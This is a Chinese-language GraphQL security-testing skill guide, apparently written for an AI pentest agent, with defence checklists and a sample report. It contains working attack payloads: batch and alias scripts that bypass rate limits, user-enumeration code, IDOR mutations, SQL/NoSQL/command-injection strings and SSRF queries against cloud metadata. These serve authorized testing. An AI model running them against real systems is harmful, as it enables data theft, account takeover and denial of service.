---
name: graphql-security-testing
description: GraphQL API安全测试专项技能，覆盖Introspection枚举、查询深度限制绕过、批量查询、字段建议、N+1查询、订阅越权等GraphQL特有攻击面
metadata:
  version: 1.0.0
  categories: [web-security, api-testing, graphql]
  requires_tools: [graphql-scanner, chrome-devtools]
---

# GraphQL Security Testing

## 使用边界与发散原则

- 本 skill 是最低覆盖要求、风险清单和证据标准，不是唯一测试路径或固定脚本。执行时必须根据目标技术栈、入口形态、认证状态、业务流程、已有证据、WAF/限速和授权范围调整方法。
- 文中的步骤、payload、命令、工具名和执行顺序默认是候选方法；除非本 skill、系统提示或后端门禁明确写为“必须/禁止/强制”，不要照抄固定列表，也不要因为示例没覆盖某个旁路、协议、参数位置、文件格式或业务入口就跳过。
- 发现阶段的字符串、端点、token、id、报错、组件名和扫描命中只作为候选信号；先记录和复核，不要仅凭单个关键词直接认定漏洞或加载多个无关专项流程。只有交互证据、可复现行为或明确进入对应专项测试时，才提升为专项验证。
- 每一步都应输出证据、判断理由和下一步分支；工具失败时先修参数、配置、环境或改用更合适的专业工具，确认无法覆盖时再使用通用命令兜底。
- 授权范围、低噪声、数据最小化、复现证据、误报排除和报告要求是硬边界；这些约束高于任何示例命令或默认流程。

## 概述

GraphQL是一种API查询语言，相比REST具有灵活性，但也引入独特的安全风险。传统的Web扫描器对GraphQL支持不足，需要专门的测试方法。

**GraphQL特有风险**：
- Introspection暴露完整schema
- 深度嵌套查询导致资源耗尽
- 批量查询绕过速率限制
- 字段级授权缺失（IDOR）
- N+1查询性能攻击
- Subscription越权订阅

---

## GraphQL基础

### 查询示例

```graphql
# 查询 (Query)
query {
  user(id: "123") {
    name
    email
    posts {
      title
      comments {
        text
      }
    }
  }
}

# 变更 (Mutation)
mutation {
  createPost(title: "Hello", content: "World") {
    id
    title
  }
}

# 订阅 (Subscription)
subscription {
  messageAdded(roomId: "room1") {
    text
    author
  }
}
```

### 端点识别

```markdown
常见GraphQL端点：
- /graphql
- /api/graphql
- /graphql/v1
- /query
- /gql
- /api
- /v1/graphql
- /console (GraphiQL/Playground)
```

---

## 测试流程

### 阶段1：端点发现与指纹识别

#### 1.1 GraphQL端点探测

```bash
# 使用graphql-scanner工具
graphql-scanner --url https://target.com --discover

# 手动探测
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { __typename }"}'

# 典型响应
{"data": {"__typename": "Query"}}  # 确认是GraphQL端点
```

#### 1.2 HTTP方法测试

```markdown
测试所有HTTP方法：
- POST /graphql (标准)
- GET /graphql?query={...} (某些实现支持)
- PUT /graphql (错误配置)

注意：GET请求可能绕过某些WAF规则
```

#### 1.3 IDE/Playground检测

```markdown
常见开发工具端点：
- /graphiql
- /playground
- /graphql/console
- /__graphql
- /api/graphql/playground

风险：
- 暴露完整schema
- 提供查询历史
- 绕过认证（开发环境遗留）
```

---

### 阶段2：Introspection枚举

#### 2.1 完整Schema查询

**Introspection查询**：

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}
```

**使用工具自动化**：

```bash
# graphql-scanner自动提取schema
graphql-scanner --url https://target.com/graphql --introspect --output schema.json

# 或使用GraphQL Voyager可视化schema
```

#### 2.2 Introspection被禁用时的绕过

```graphql
# 方法1：字段建议 (Field Suggestion)
query {
  __typename
  useeeeeer  # 故意拼写错误
}

# 响应可能包含提示：
{
  "errors": [{
    "message": "Cannot query field 'useeeeeer' on type 'Query'. Did you mean 'user'?"
  }]
}

# 方法2：部分Introspection
query {
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
      }
    }
  }
}

# 方法3：枚举已知类型
# 尝试常见类型名：User, Admin, Post, Product, Order等
```

#### 2.3 Schema分析

从schema中提取关键信息：

```python
# 分析schema.json
import json

schema = json.load(open('schema.json'))

# 1. 查找敏感查询
sensitive_queries = []
for type in schema['__schema']['types']:
    if type['name'] == 'Query':
        for field in type.get('fields', []):
            if any(keyword in field['name'].lower() for keyword in ['admin', 'internal', 'secret', 'private']):
                sensitive_queries.append(field['name'])

# 2. 查找未授权的mutation
mutations = []
for type in schema['__schema']['types']:
    if type['name'] == 'Mutation':
        mutations = [f['name'] for f in type.get('fields', [])]

# 3. 查找可枚举的ID字段
# 如: user(id: Int), post(id: String)
```

---

### 阶段3：查询深度与复杂度攻击

#### 3.1 深度嵌套查询

**原理**：构造深层嵌套查询消耗服务器资源。

```graphql
# 假设schema：User -> Post -> Comment -> User -> Post -> ...
query DeepQuery {
  user(id: "1") {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  comments {
                    author {
                      name  # 第9层
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

**自动化生成**：

```python
def generate_deep_query(depth=10):
    query = "query DeepQuery { user(id: \"1\") {"

    for i in range(depth):
        if i % 2 == 0:
            query += " posts { "
        else:
            query += " comments { author { "

    query += " name "
    query += " } " * depth

    return query

# 测试不同深度
for depth in [5, 10, 20, 50]:
    test_query(generate_deep_query(depth))
```

#### 3.2 循环查询攻击

```graphql
# 如果schema存在循环引用：User <-> Post
query CircularQuery {
  user(id: "1") {
    posts {
      author {
        posts {
          author {
            posts {
              # 无限循环
            }
          }
        }
      }
    }
  }
}
```

#### 3.3 宽度攻击（请求大量字段）

```graphql
query WideQuery {
  user(id: "1") {
    id
    name
    email
    phone
    address
    bio
    avatar
    createdAt
    updatedAt
    posts { id title content }
    comments { id text }
    followers { id name }
    following { id name }
    likes { id }
    # 请求所有可用字段
  }
}
```

---

### 阶段4：批量查询攻击

#### 4.1 Batching绕过速率限制

**原理**：单个HTTP请求中包含多个GraphQL查询。

```json
// HTTP POST body
[
  {"query": "query { user(id: \"1\") { name } }"},
  {"query": "query { user(id: \"2\") { name } }"},
  {"query": "query { user(id: \"3\") { name } }"},
  // ... 重复1000次
]
```

**自动化测试**：

```python
import requests

def batch_query_attack(url, query_template, count=1000):
    queries = []
    for i in range(1, count + 1):
        queries.append({
            "query": query_template.format(id=i)
        })

    response = requests.post(
        url,
        json=queries,
        headers={"Content-Type": "application/json"}
    )

    return response

# 测试
batch_query_attack(
    "https://target.com/graphql",
    "query {{ user(id: \"{id}\") {{ name email }} }}"
)
```

#### 4.2 Alias别名攻击

**原理**：单个查询中使用别名多次请求同一字段。

```graphql
query AliasAttack {
  user1: user(id: "1") { name }
  user2: user(id: "2") { name }
  user3: user(id: "3") { name }
  # ... 重复10000次
  user10000: user(id: "10000") { name }
}
```

**自动化生成**：

```python
def generate_alias_attack(count=1000):
    query = "query AliasAttack {\n"
    for i in range(1, count + 1):
        query += f'  user{i}: user(id: "{i}") {{ name }}\n'
    query += "}"
    return query

# 测试
test_query(generate_alias_attack(5000))
```

---

### 阶段5：IDOR与授权测试

#### 5.1 ID枚举

```graphql
# 顺序枚举用户ID
query {
  user(id: "1") { name email }
  user(id: "2") { name email }
  # ...
  user(id: "1000") { name email }
}
```

**自动化ID枚举**：

```python
def enumerate_users(url, id_range):
    results = []

    for user_id in id_range:
        query = f'query {{ user(id: "{user_id}") {{ id name email role }} }}'
        response = requests.post(url, json={"query": query})
        data = response.json()

        if "errors" not in data:
            results.append(data['data']['user'])

    return results

# 发现所有可访问的用户
users = enumerate_users("https://target.com/graphql", range(1, 10000))
```

#### 5.2 字段级授权测试

```graphql
# 测试敏感字段访问
query {
  user(id: "other_user_id") {
    name           # 公开字段
    email          # 敏感字段，应该被拒绝
    phoneNumber    # 敏感字段
    ssn            # 高度敏感
    creditCard     # 极度敏感
  }
}

# 测试：
# 1. 未登录状态
# 2. 普通用户访问其他用户
# 3. 低权限角色访问高权限字段
```

#### 5.3 Mutation越权

```graphql
# 测试修改其他用户数据
mutation {
  updateUser(id: "other_user_id", input: {
    email: "attacker@evil.com"
  }) {
    id
    email
  }
}

# 测试删除其他用户
mutation {
  deleteUser(id: "other_user_id") {
    success
  }
}
```

---

### 阶段6：注入攻击

#### 6.1 SQL注入

```graphql
# 如果后端直接拼接SQL
query {
  user(id: "1' OR '1'='1") {
    name
  }
}

# 时间盲注
query {
  user(id: "1' AND SLEEP(5) AND '1'='1") {
    name
  }
}
```

#### 6.2 NoSQL注入

```graphql
# MongoDB注入
query {
  user(id: "1", filter: "{\"role\": {\"$ne\": null}}") {
    name
    role
  }
}
```

#### 6.3 命令注入

```graphql
# 如果mutation执行系统命令
mutation {
  generateReport(format: "pdf; whoami") {
    url
  }
}
```

#### 6.4 SSRF

```graphql
# 如果GraphQL从URL获取数据
query {
  fetchContent(url: "http://localhost:8080/admin") {
    content
  }
}

# 测试内网探测
query {
  fetchContent(url: "http://169.254.169.254/latest/meta-data/") {
    content
  }
}
```

---

### 阶段7：N+1查询攻击

**原理**：触发后端大量数据库查询，导致性能下降。

```graphql
# 假设每个user的posts需要单独查询数据库
query {
  users(limit: 100) {  # 1次查询获取100个用户
    name
    posts {  # 每个用户触发1次查询，共100次
      title
      comments {  # 每个post触发1次查询，如果有1000个post，就是1000次
        text
      }
    }
  }
}

# 总查询数：1 + 100 + 1000 + ...
```

**测试**：

```python
# 监控响应时间
import time

queries = [
    'query { users(limit: 10) { name } }',  # 基准
    'query { users(limit: 10) { name posts { title } } }',  # +1层
    'query { users(limit: 10) { name posts { title comments { text } } } }',  # +2层
]

for query in queries:
    start = time.time()
    response = requests.post(url, json={"query": query})
    elapsed = time.time() - start
    print(f"Query: {query[:50]}... | Time: {elapsed}s")
```

---

### 阶段8：Subscription订阅测试

**相关内容已在websocket-security-testing skill中覆盖**，GraphQL Subscription通过WebSocket实现。

重点测试：

```graphql
# 1. 订阅越权
subscription {
  messageAdded(roomId: "admin_room") {
    text
  }
}

# 2. 订阅所有事件
subscription {
  allEvents {
    type
    data
  }
}

# 3. 批量订阅
subscription {
  room1: messageAdded(roomId: "1") { text }
  room2: messageAdded(roomId: "2") { text }
  # ... 1000个订阅
}
```

---

### 阶段9：GraphQL特定功能滥用

#### 9.1 指令(Directive)滥用

```graphql
# @skip和@include指令
query {
  user(id: "1") {
    name
    email @include(if: true)
    ssn @include(if: true)  # 测试是否绕过字段授权
  }
}

# 自定义指令测试
query {
  user(id: "1") @debug {  # 某些实现的调试指令
    name
  }
}
```

#### 9.2 Fragment滥用

```graphql
# 深度嵌套Fragment
fragment UserData on User {
  name
  posts {
    ...PostData
  }
}

fragment PostData on Post {
  title
  author {
    ...UserData  # 循环引用
  }
}

query {
  user(id: "1") {
    ...UserData
  }
}
```

---

## 工具集成

### CyberStrikeAI工具

```bash
# GraphQL schema提取
graphql-scanner --url https://target.com/graphql --introspect

# 自动化漏洞扫描
graphql-scanner --url https://target.com/graphql --scan-all

# 批量查询测试
graphql-scanner --url https://target.com/graphql --batch-attack --count 1000
```

### 外部工具

```bash
# GraphQL Voyager (schema可视化)
# https://github.com/APIs-guru/graphql-voyager

# InQL (Burp扩展)
# 自动Introspection、生成查询模板

# graphql-playground
# 交互式查询界面

# graphw00f (指纹识别)
python3 graphw00f.py -t https://target.com/graphql
```

---

## 防御验证

### 必须实施的防御

```markdown
✓ 检查项：

1. [ ] Introspection在生产环境禁用
2. [ ] 查询深度限制 (推荐: 最大7层)
3. [ ] 查询复杂度限制 (计算查询成本)
4. [ ] 速率限制 (基于IP、用户、query hash)
5. [ ] 批量查询禁用或限制数量
6. [ ] 字段级授权 (每个字段独立验证权限)
7. [ ] 查询超时设置
8. [ ] DataLoader/批量加载 (解决N+1)
9. [ ] 输入验证与过滤
10. [ ] 错误消息不暴露敏感信息
```

---

## 实战案例

### 案例1：Introspection暴露管理员查询

```graphql
# Introspection发现隐藏查询
query {
  __type(name: "Query") {
    fields {
      name
    }
  }
}

# 响应包含：
{
  "fields": [
    {"name": "user"},
    {"name": "posts"},
    {"name": "internalAdminReport"}  # 隐藏的admin查询
  ]
}

# 利用
query {
  internalAdminReport {
    allUsers {
      email
      password_hash
    }
  }
}
```

### 案例2：批量查询绕过速率限制

```bash
# 正常请求受速率限制（100请求/分钟）
# 但批量查询单个HTTP请求包含1000个查询

curl -X POST https://target.com/graphql \
  -d '[
    {"query": "query { user(id: \"1\") { email } }"},
    {"query": "query { user(id: \"2\") { email } }"},
    ... // 1000个查询
  ]'

# 绕过速率限制，枚举10000用户数据
```

### 案例3：字段级授权缺失导致信息泄露

```graphql
# 普通用户访问其他用户敏感字段
query {
  user(id: "admin_id") {
    name      # 公开
    email     # 应该被拒绝，但返回了
    ssn       # 应该被拒绝，但返回了
    salary    # 应该被拒绝，但返回了
  }
}

# 根本原因：只验证了query级别授权，未验证字段级别
```

---

## 输出报告模板

```markdown
# GraphQL安全测试报告

## 目标
- GraphQL端点: https://api.example.com/graphql
- 版本: Apollo Server 3.x

## Schema信息
- Queries: 45个
- Mutations: 23个
- Subscriptions: 5个
- 自定义类型: 67个

## 漏洞发现

### [严重] Introspection未禁用
**描述**: 生产环境暴露完整schema

**影响**:
- 攻击者获得完整API结构
- 发现未公开的admin查询
- 枚举所有字段和类型

**PoC**:
\`\`\`graphql
query { __schema { types { name fields { name } } } }
\`\`\`

**修复**:
\`\`\`javascript
// Apollo Server配置
new ApolloServer({
  introspection: false,  // 生产环境禁用
})
\`\`\`

### [高危] 无查询深度限制
**描述**: 可构造50层嵌套查询

**PoC**:
\`\`\`graphql
query {
  user { posts { comments { author { posts { ... } } } } }
}
\`\`\`

**影响**: 服务器资源耗尽

**修复**:
\`\`\`javascript
const depthLimit = require('graphql-depth-limit');
new ApolloServer({
  validationRules: [depthLimit(7)]
})
\`\`\`

### [高危] 字段级授权缺失
**描述**: 普通用户可查询其他用户的敏感字段

**PoC**:
\`\`\`graphql
query {
  user(id: "other_user") {
    email    # 成功返回
    ssn      # 成功返回
    salary   # 成功返回
  }
}
\`\`\`

**修复**: 在字段resolver中验证权限
\`\`\`javascript
User: {
  email: (user, args, context) => {
    if (context.user.id !== user.id && !context.user.isAdmin) {
      throw new ForbiddenError('Unauthorized');
    }
    return user.email;
  }
}
\`\`\`

## 建议优先级
1. P0: 禁用Introspection
2. P0: 实施字段级授权
3. P1: 添加查询深度限制
4. P1: 实施速率限制
5. P2: 禁用批量查询
```

---

## 参考资料

- [GraphQL Security Best Practices](https://www.apollographql.com/docs/apollo-server/security/)
- [OWASP GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [GraphQL深度限制](https://github.com/stems/graphql-depth-limit)
- [Escape GraphQL](https://blog.escape.tech/tag/graphql-security/)
